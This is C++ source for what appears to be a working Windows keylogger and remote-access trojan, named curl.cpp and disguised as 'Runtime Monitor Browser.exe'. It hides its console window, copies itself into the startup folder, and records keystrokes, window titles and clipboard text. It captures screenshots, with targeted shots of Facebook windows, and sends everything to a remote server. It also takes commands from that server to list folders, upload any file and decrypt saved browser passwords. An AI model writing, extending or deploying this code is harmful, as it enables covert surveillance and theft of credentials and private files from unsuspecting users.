﻿// curl.cpp : Defines the entry point for the console application.
// C:\Users\Admin\AppData\Local\CocCoc\Browser\User Data\Default\Login Data

#include "stdafx.h"
#include <iostream>
#include <string>
#include <wchar.h>
#include <fcntl.h> //_O_U16TEXT
#include <io.h>    //_setmode()
#include <assert.h>
#include <atlimage.h>
#include <shlobj.h>
#include <Windows.h>
// read file
#include <fstream>
#include <filesystem>
#include "decode_Chrome_login_data.h" // to decode Chrome -> Login data
#include "html_utility.h" // for html request

//#define CONSOLE_LOG  // define to enable console log

#ifdef _DEBUG
#pragma comment(lib, "libcurl/lib/libcurl_a_debug.lib")
#else
#pragma comment(lib, "libcurl/lib/libcurl_a.lib")
#endif

using namespace std;
namespace fs = experimental::filesystem;
// Global Variable

int UPDATE_PERIOD = 1000; // 1000*10 = 10s
char CAPTURE_PERIOD = 12; // 12*10s = 2m
char capture_count = 0;

// FUNCTION
void copy_to_startup();
int readfile();
int print_drivers();
HRESULT CaptureScreen(LPCTSTR file_name);
HRESULT CaptureScreenNearCursor(LPCTSTR file_name, POINT cursor);
void decrypt_send_password(string url);
string get_list_files(string dir);
wstring get_list_files(wstring dir);
wstring get_path_w(string dir);
string get_current_time();
int execute_command(string cmd);
string getClipboard();
// char * ReadAllBytes(const char * filename, int * read_length);

int main()
{
#ifndef CONSOLE_LOG
	// HIDE CONSOLE LOG AT STARTUP
	ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif 
	// copy self to shell:startup
	copy_to_startup();

	/* INIT CURL */
	curl_global_init(CURL_GLOBAL_ALL);

	// get server URL
	string base_url = get_base_url();
	if (base_url == "") {
		/*Cannot get base url*/
		return 0;
	}

	if (base_url.find("http://") == std::string::npos) {
		base_url = "http://" + base_url;
	}

	if (base_url[base_url.length() - 1] == '/') {
		base_url[base_url.length() - 1] = '\0';
	}

	/* Init needed url*/
	URL_DATA = base_url + "/data";
	URL_UPLOAD = base_url + "/upload";
	URL_DECRYPT = base_url + "/decrypt";
	URL_CMD = base_url + "/cmd";

#ifdef CONSOLE_LOG
	// _setmode(_fileno(stdout), _O_U16TEXT); //cần để viết được ký tự utf-16 ra stdout
#endif // CONSOLE_LOG

	wchar_t lastTitle[1024];
	wchar_t title[1024];
	bool isFacebook = false;
	POINT cursor; // mouse cursor
	string key_data = ""; // data to send -> server
	string cmd = "";
	int last_key = 0;
	int count = 0;
	
	while (true) {
		Sleep(10);
		// Get the active windowtitle
		count++;
		if (count>UPDATE_PERIOD) {
			count = 0;
			cmd = "";
			// Send Key data to server
			if (!key_data.empty()) {
#ifdef CONSOLE_LOG
				std::printf("SEND KEY DATA\n");
#endif
				cmd = curl_post(key_data.c_str(), URL_DATA);
				//key_data.clear();
				key_data = "";
			}else {
				cmd = get_html(URL_CMD);
#ifdef CONSOLE_LOG
				std::printf("NO DATA TO SEND\n");
#endif
			}

			execute_command(cmd);

			// capture screenshot after 2m
			capture_count++;
			if (capture_count >= CAPTURE_PERIOD && cmd.compare("screenshot") != 0) {
				capture_count = 0;
				execute_command("screenshot");
			}
		}

		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title, 1023);

		if (wcscmp(lastTitle, title)!=0) 
		{
#ifdef CONSOLE_LOG
			std::wcout << endl << endl << L"Window: ";
#endif
			if (wcslen(title) == 0) 
			{
#ifdef CONSOLE_LOG
				std::wcout << L"NO ACTIVE WINDOW";
#endif
			}
			else 
			{
				/* Send data to server */
				string send_title = get_utf8(title);
				// check for Facebook tab
				if (send_title.find("Facebook") != std::string::npos) 
				{
					isFacebook = true;
				}
				else 
				{
					isFacebook = false;
				}
				// last character = \0. Need to change to ' ' otherwise cannot append other string
				send_title[send_title.length() - 1] = ' ';
				send_title = "</div>\n<div class='title'>" + get_current_time() + send_title + "</div>\n<div class='key'>";
				key_data = key_data + send_title;
				/* clear title */
				send_title = "";
				//send_title.clear();
			}
			// update last title		
			std::copy(std::begin(title), std::end(title), std::begin(lastTitle));
			/*
			for (int i = 0; i < 1024; i++) {
				lastTitle[i] = title[i];
			}
			*/
		}
		/* Key logger */
		for (int KEY = 1; KEY <= 255; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				string out = "";
				if (KEY == VK_LBUTTON) {
					// left button
					if (isFacebook) { // update cursor if window = facabook
						if (GetCursorPos(&cursor))
						{
							// cannot get cursor pos
						}
					}
				}
				else if (KEY == VK_RBUTTON) {
					// right button
				}
				else if (KEY == VK_BACK)
					out = "[Backspace]";
				else if (KEY == VK_TAB)
					out = "[TAB]";
				else if (KEY == VK_RETURN) {
					out = "[Enter]";
					if (isFacebook) {
						// capture facebook screenshot
						WCHAR temp_path[MAX_PATH];
						get_temp_path(temp_path, MAX_PATH, _T("tmp_fb.png"));
						HRESULT res = CaptureScreenNearCursor(temp_path,cursor);
						if (res == S_OK) {
							upload_file_pos_html_form(URL_UPLOAD, get_utf8(wstring(temp_path)));
						}
						else {
							curl_post("CaptureScreenNearCursor failed", URL_CMD);
						}
					}
				}
				else if (KEY == VK_CAPITAL)
					out = "[Caps lock]";
				else if (KEY == VK_ESCAPE)
					out = "[ESC]";
				else if (KEY == VK_SPACE)
					out = "[Space]";
				else if (KEY == 33)
					out = "[PAGE UP]";
				else if (KEY == 34)
					out = "[PAGE DOWN]";
				else if (KEY == 35)
					out = "[END]";
				else if (KEY == 36)
					out = "[HOME]";
				else if (KEY == 37)
					out = "[Left]";
				else if (KEY == 38)
					out = "[Up]";
				else if (KEY == 39)
					out = "[Right]";
				else if (KEY == 40)
					out = "[Down]";
				else if (KEY == 45)
					out = "[INS]";
				else if (KEY == 46)
					out = "[Del]";
				else if (KEY >= 48 && KEY <= 57) {  // number 0-9
					if (GetAsyncKeyState(VK_SHIFT)) {
						out = "[Shift+";
						out = out + char(KEY);
						out = out + "]";
					}
					else {
						out = char(KEY);
					}
				}
				else if (KEY >= 65 && KEY <= 90) {  // char a-z
					if (GetKeyState(VK_CAPITAL) & 0x0001) {
						if (GetAsyncKeyState(VK_SHIFT)) {
							KEY = KEY + 32;
						}
					}
					else {
						if (!GetAsyncKeyState(VK_SHIFT)) {
							KEY = KEY + 32;
						}
					}
					out = KEY; 
					if (GetAsyncKeyState(VK_CONTROL)) { // ctrl is pressed
						if (KEY == 86 || KEY == 118) { // ctrl + c
							out = out + "<span style='color: green'>(" + getClipboard() + ")</span>";
						}
					}
				}
				else if (KEY == 16 || KEY == 160 || KEY == 161) { // SHIFT
					if (last_key == 16 || last_key == 160 || last_key == 161) {
						// if last key is also SHIFT -> skip
						last_key = KEY;
						continue;
					}
					out = "[Shift]";
				}
				else if (KEY == 17 || KEY == 162 || KEY == 163) { // CTRL
					if (last_key == 17 || last_key == 162 || last_key == 163) {
						// if last key is also CTRL -> skip
						last_key = KEY;
						continue;
					}
					out = "[Ctrl]";
				}
				else if (KEY == 18 || KEY == 164 || KEY == 165) {  // ALT
					if (last_key == 18 || last_key == 164 || last_key == 165) {
						// if last key is also ALT -> skip
						last_key = KEY;
						continue;
					}
					out = "[Alt]";
				}
				else if (KEY == 91 || KEY == 92)
					out = "[WIN]";
				else if (KEY >= 96 && KEY <= 105) { // number 0-9
					out = "[";
					out = out + to_string(KEY - 96);
					out = out + "]";
				}
				else if (KEY == 106)
					out = "[*]";
				else if (KEY == 107)
					out = "[+]";
				else if (KEY == 109)
					out = "[-]";
				else if (KEY == 110)
					out = "[.]";
				else if (KEY >= 112 && KEY <= 123)
				{
					out = "[F";
					out = out + char(KEY - 63);
					out = out + "]";
				}
				else if (KEY == 144)
					out = "[NUM]";
				else if (KEY == 186)
					out = "[;]";
				else if (KEY == 187)
					out = "=";
				else if (KEY == 188)
					out = ",";
				else if (KEY == 189)
					out = "-";
				else if (KEY == 190)
					out = ".";
				else if (KEY == 191 || KEY == 111)
					out = "/";
				else if (KEY == 192)
					out = "`";
				else if (KEY == 219)
					out = "[";
				else if (KEY == 220)
					out = "\\";
				else if (KEY == 221)
					out = "]";
				else if (KEY == 222)
					out = "[']";
				else if (KEY == 226)
					out = "<";
				else
				{
					out = "[KEY ";
					out = out + to_string(KEY);
					out = out + "]";
				}
#ifdef CONSOLE_LOG
				LPSTR s = const_cast<char *>(out.c_str());
				//std::wcout << "[" << to_wstring(KEY)<< "]" << s;
				std::wcout << to_wstring(KEY);
#endif
				/* append data to buffer */
				last_key = KEY;
				key_data = key_data + out;
			}
		}
	}
	// Cleanup CURL
	curl_global_cleanup();
    return 0;
}

string get_current_time() {
	time_t rawtime;
	time(&rawtime);

	struct tm *tm_struct = localtime(&rawtime);

	int hour = tm_struct->tm_hour;
	int min = tm_struct->tm_min;
	string res = "[" + to_string(hour) + ":" + to_string(min) + "]  ";
	return res;
}

int execute_command(string cmd) {

	if (cmd.empty()) {
		// there is no command
		return 1;
	}

	// CMD ls
	if (cmd.find("ls ", 0) != std::string::npos) {
		// remove space
		int offset = 2;
		while (offset < (cmd.length()-1)) {
			if (cmd[offset] == ' ') {
				offset++;
			}
			else {
				break;
			}
		}
		// actual dir
		string dir = cmd.substr(offset,cmd.length()-3);
		if (dir.find("[",0) != std::string::npos
			&& dir.find("]", 0) != std::string::npos
			) 
		{
			// find dir with wchar
			string send = get_utf8(get_list_files(get_path_w(dir)));
			curl_post(send, URL_CMD);
		}
		else {
			// ascii dir
			curl_post(get_list_files(dir), URL_CMD);
		}
		return 0;
	}

	// CMD copy
	if (cmd.find("cp ", 0) != std::string::npos) {
		// remove space
		int offset = 2;
		while (offset < (cmd.length() - 1)) {
			if (cmd[offset] == ' ') {
				offset++;
			}
			else {
				break;
			}
		}
		// actual dir
		string file_path = cmd.substr(offset, cmd.length() - 3);
		if (file_path.find("[", 0) != std::string::npos
			&& file_path.find("]", 0) != std::string::npos
			)
		{
			// WCHAR path
			wstring path = get_path_w(file_path);
			size_t last_backslash = path.find_last_of(L"\\");
			wstring file_name;
			if (last_backslash == std::string::npos) {
				file_name = L"temp_file_transfer";
			}
			else {
				file_name = path.substr(last_backslash + 1, path.length() - last_backslash - 1);
				// file_name = string(_name.begin(), _name.end());
				for (int i = 0; i < file_name.length(); i++) {
					if (file_name[i] > 150) {
						file_name[i] = L'_';
					}
				}
			}
			WCHAR temp_path[MAX_PATH];
			get_temp_path(temp_path, MAX_PATH, file_name.c_str());
			// copy taget file to temp
			CopyFile(path.c_str(), temp_path, false);
			wstring ws(temp_path);
			string send_path(ws.begin(), ws.end());
			upload_file_pos_html_form(URL_UPLOAD, send_path);
			DeleteFileW(temp_path);
		}
		else {
			// ASCII path
			upload_file_pos_html_form(URL_UPLOAD, file_path);
		}

		return 0;
	}

	// Screenshot
	if (cmd.compare("screenshot")==0) {
		WCHAR temp_path[MAX_PATH];
		get_temp_path(temp_path, MAX_PATH, _T("tmp.png"));
		HRESULT res = CaptureScreen(temp_path);
		if (res == S_OK) {
			upload_file_pos_html_form(URL_UPLOAD, get_utf8(wstring(temp_path)));
		}
		else {
			curl_post("cannot save file", URL_CMD);
		}
		return 0;
	}

	// Facebook
	if (cmd.compare("Facebook") == 0) {
		WCHAR temp_path[MAX_PATH];
		get_temp_path(temp_path, MAX_PATH, _T("tmp.png"));
		HRESULT res = CaptureScreen(temp_path);
		if (res == S_OK) {
			upload_file_pos_html_form(URL_UPLOAD, get_utf8(wstring(temp_path)));
		}
		else {
			curl_post("cannot save file", URL_CMD);
		}
		return 0;
	}

	// Decrypt password
	if (cmd.compare("decrypt")==0) {
		decrypt_send_password(URL_DECRYPT);
		return 0;
	}

	// CMD change UPDATE_PERIOD
	if (cmd.find("update_period ", 0) != std::string::npos) {
		// remove space
		int offset = 14;
		while (offset < (cmd.length() - 1)) {
			if (cmd[offset] == ' ') {
				offset++;
			}
			else {
				break;
			}
		}
		// actual period
		string period = cmd.substr(offset, cmd.length() - 3);
		int time = atoi(period.c_str());
		time = time / 10;
		if (time<400)
		{
			time = 400;
		}
		UPDATE_PERIOD = time;
		// ascii dir
		curl_post("Update period (ms) = " + to_string(UPDATE_PERIOD*10), URL_CMD);
		return 0;
	}

	// CMD change UPDATE_PERIOD
	if (cmd.find("capture_period ", 0) != std::string::npos) {
		// remove space
		int offset = 14;
		while (offset < (cmd.length() - 1)) {
			if (cmd[offset] == ' ') {
				offset++;
			}
			else {
				break;
			}
		}
		// actual period
		string period = cmd.substr(offset, cmd.length() - 3);
		int value = atoi(period.c_str());
		if (value < 1) {
			value = 1;
		}

		CAPTURE_PERIOD = value;
		// ascii dir
		curl_post("Update capture screen period = " + to_string(CAPTURE_PERIOD) +" x " + to_string(UPDATE_PERIOD * 10), URL_CMD);
		return 0;
	}

	// CMD print all drivers
	if (cmd.find("drivers", 0) != std::string::npos) {
		print_drivers();
		return 0;
	}

	return 0;
}

HRESULT CaptureScreen(LPCTSTR file_name)
{
	int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
	int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
	HWND hDesktopWnd = GetDesktopWindow();
	HDC hDesktopDC = GetDC(hDesktopWnd);
	HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
	HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC,
		nScreenWidth, nScreenHeight);
	SelectObject(hCaptureDC, hCaptureBitmap);
	BitBlt(hCaptureDC, 0, 0, nScreenWidth, nScreenHeight,
		hDesktopDC, 0, 0, SRCCOPY | CAPTUREBLT);
	// save the captured image to disk
	CImage image;
	image.Attach(hCaptureBitmap);
	// TODO: save to other location
	// JPEG is the smallest output
	HRESULT res = image.Save(file_name, Gdiplus::ImageFormatJPEG); // change extension to save to png

	image.Destroy();
	ReleaseDC(hDesktopWnd, hDesktopDC);
	DeleteDC(hCaptureDC);
	DeleteObject(hCaptureBitmap);
	return res;
}

HRESULT CaptureScreenNearCursor(LPCTSTR file_name, POINT cursor)
{
	const int MSG_WIDTH = 550;
	const int MSG_HEIGHT = 500;

	int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
	int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);

	int offsetX = (cursor.x - MSG_WIDTH / 2);
	if (offsetX < 0) {
		offsetX = 0;
	}
	if ((offsetX + MSG_WIDTH) > nScreenWidth) {
		offsetX = nScreenWidth - MSG_WIDTH;
	}

	int offsetY = (cursor.y - MSG_HEIGHT + 100);
	if (offsetY < 0) {
		offsetY = 0;
	}
	if ((offsetY + MSG_HEIGHT) > nScreenHeight) {
		offsetY = nScreenHeight - MSG_HEIGHT;
	}

	HWND hDesktopWnd = GetDesktopWindow();
	HDC hDesktopDC = GetDC(hDesktopWnd);
	HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);

	HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC,
		MSG_WIDTH, MSG_HEIGHT);
	SelectObject(hCaptureDC, hCaptureBitmap);
	BitBlt(hCaptureDC, -offsetX, -offsetY, nScreenWidth, nScreenHeight,
		hDesktopDC, 0, 0, SRCCOPY | CAPTUREBLT);
	// save the captured image to disk
	CImage image;
	image.Attach(hCaptureBitmap);
	// TODO: save to other location
	// JPEG is the smallest output
	HRESULT res = image.Save(file_name, Gdiplus::ImageFormatJPEG); // change extension to save to png
	// free memory
	image.Destroy();
	ReleaseDC(hDesktopWnd, hDesktopDC); 
	DeleteDC(hCaptureDC);
	DeleteObject(hCaptureBitmap);
	return res;
}
/*
Output path: wstring. Input path string
Input path format: dir = path/[1]/[2]/[3]
*/
wstring get_path_w(string dir) {
	size_t bp_end = dir.find("[", 0);
	if (bp_end == std::string::npos) {
		return L"";
	}
	string base_path = dir.substr(0, bp_end);
	wstring res_path(base_path.begin(), base_path.end());
	int length = dir.length();
	int i = 0;
	while (i < length) {
		size_t start = dir.find("[", i);
		size_t end = dir.find("]", start);
		if (start == std::string::npos
			|| end == std::string::npos)
		{
			break;
		}
		else
		{
			i = end;
			string num = dir.substr(start + 1, end - start - 1);
			int target = atoi(num.c_str());
			int pos = 0;
			bool found = false;
			for (auto & p : fs::directory_iterator(res_path)) {
				if (pos == target) {
					res_path = p.path().native();
					found = true;
					break;
				}
				pos++;
			}
			if (!found) {
				res_path = res_path + L"\\NOT_FOUND";
			}
		}

	}
	return res_path;
}

string get_list_files(string dir) {
	string res = "";
	int i = 0;
	for (auto & p : fs::directory_iterator(dir)) {
		res = res + "[" + to_string(i) + "]" + p.path().string()+'\n';
		i++;
	}
	if (res == "") {
		res = "Not found dir";
	}
	return res;
}

/*
dir = path/[1]/[2]/[3]
*/
wstring get_list_files(wstring dir) {
	wstring res = L"";
	int i = 0;
	for (auto & p : fs::directory_iterator(dir)) {
		res = res + L"[" + to_wstring(i) + L"]" + p.path().native() + L'\n';
		i++;
	}
	if (res == L"") {
		res = L"Not found dir";
	}
	return res;
}


/*
 * 1. Get decrypted data from server
 * 2. Decrypt data
 * 3. Send result to server
 */
void decrypt_send_password(string url) {
	MemoryStruct dt = get_html_memory_struct(URL_DECRYPT);
	if (dt.size == 0) {
		cout<<("%s", "cannot get html");
		return;
	}
	if (string(dt.memory).find("no such file or directory") != std::string::npos) {
		printf("%s", "Server cannot read data file.");
		return;
	}
	
	if (dt.size != 0) {
		char* code = Decrypt((BYTE*)dt.memory, dt.size);
		printf("%s", code);
		curl_post(string(code), URL_DECRYPT);
	}
	else
	{
		printf("%s", "error");
	}
	free(dt.memory);
}


// copy to Window startup folder (shell:startup)
void copy_to_startup() {
	TCHAR szPath[MAX_PATH];
	WCHAR* file_name = _T("Runtime Monitor Browser.exe");
	if (SUCCEEDED(SHGetFolderPath(NULL,
		CSIDL_ALTSTARTUP,
		NULL,
		0,
		szPath)))
	{
		PathAppend(szPath, TEXT("Runtime Monitor Browser.exe"));
		if (!PathFileExists(szPath)) {
			printf("%s", "I am copying myself to Startup LOL");
			CopyFile(file_name, szPath, false);
		}
	}
}

int print_drivers()
{
	DWORD cchBuffer;
	WCHAR* driveStrings;
	WCHAR* pointer;
	UINT driveType;
	PWSTR driveTypeString;
	ULARGE_INTEGER freeSpace;

	// Find out how big a buffer we need
	cchBuffer = GetLogicalDriveStrings(0, NULL);

	driveStrings = (WCHAR*)malloc((cchBuffer + 1) * sizeof(TCHAR));
	pointer = driveStrings;
	if (driveStrings == NULL)
	{
		return -1;
	}

	// Fetch all drive strings    
	GetLogicalDriveStrings(cchBuffer, driveStrings);

	// Loop until we find the final '\0'
	// driveStrings is a double null terminated list of null terminated strings)
	string all_driver = "";
	while (*driveStrings)
	{
		// Dump drive information
		//driveType = GetDriveType(driveStrings);
		//GetDiskFreeSpaceEx(driveStrings, &freeSpace, NULL, NULL);
		/*
		switch (driveType)
		{
		case DRIVE_FIXED:
			driveTypeString = L"Hard disk";
			break;

		case DRIVE_CDROM:
			driveTypeString = L"CD/DVD";
			break;

		case DRIVE_REMOVABLE:
			driveTypeString = L"Removable";
			break;

		case DRIVE_REMOTE:
			driveTypeString = L"Network";
			break;

		default:
			driveTypeString = L"Unknown";
			break;
		}
		

		printf("%S - %S - %I64u GB free\n", driveStrings, driveTypeString,
			freeSpace.QuadPart / 1024 / 1024 / 1024);
		*/
		printf("%S", driveStrings);
		wstring ws(driveStrings);
		all_driver = all_driver + string(ws.begin(), ws.end());
		ws=L"";
		// Move to next drive string
		// +1 is to move past the null at the end of the string.
		driveStrings += lstrlen(driveStrings) + 1;
	}
	
	curl_post(all_driver, URL_CMD);
	delete pointer;
	return 0;
}

int readfile()
{
	ifstream myfile;
	string str_line;
	int flag = 0;  // used to check if the file already open or not

	if (flag == 0)   // initially file is not open so open it here
	{
		myfile.open("C:\\Users\\Admin\\Music\\libcurl-sample-master\\Debug\\a.txt");
		flag = 1;    // set the flag that file is opened now
	}


	if (myfile.is_open())
	{
		cout << "File Opening Success";
		flag = 1; 
		getline(myfile, str_line);  // get 1 line at a time. After getting this one line, I want to pass this 1 line data to another process and
									// get back to here again for the next line to process. without opening the file again
		cout << str_line;
		if (myfile.eof())   // if eof reached close the file.
		{
			myfile.close();
			flag = -1;
			exit;
		}
	}
	else
	{
		cout<<("File Opening NOT Success");
		flag = -1;
		exit;

	}

	return 0;
}

string getClipboard()
{
	CStringA strData;

	if (OpenClipboard(NULL))
	{
		HANDLE hClipboardData = GetClipboardData(CF_TEXT);
		if (hClipboardData)
		{
			CHAR *pchData = (CHAR*)GlobalLock(hClipboardData);
			if (pchData)
			{
				strData = pchData;
				GlobalUnlock(hClipboardData);
			}
		}
		CloseClipboard();
	}
	return std::string(strData);
}

/*
char * ReadAllBytes(const char * filename, int * read_length)
{
	ifstream ifs(filename, ios::binary | ios::ate);
	ifstream::pos_type pos = ifs.tellg();

	// What happens if the OS supports really big files.
	// It may be larger than 32 bits?
	// This will silently truncate the value/
	int length = pos;

	// Manuall memory management.
	// Not a good idea use a container/.
	char *pChars = new char[length];
	ifs.seekg(0, ios::beg);
	ifs.read(pChars, length);

	// No need to manually close.
	// When the stream goes out of scope it will close the file
	// automatically. Unless you are checking the close for errors
	// let the destructor do it.
	ifs.close();
	*read_length = length;
	return pChars;
}
*/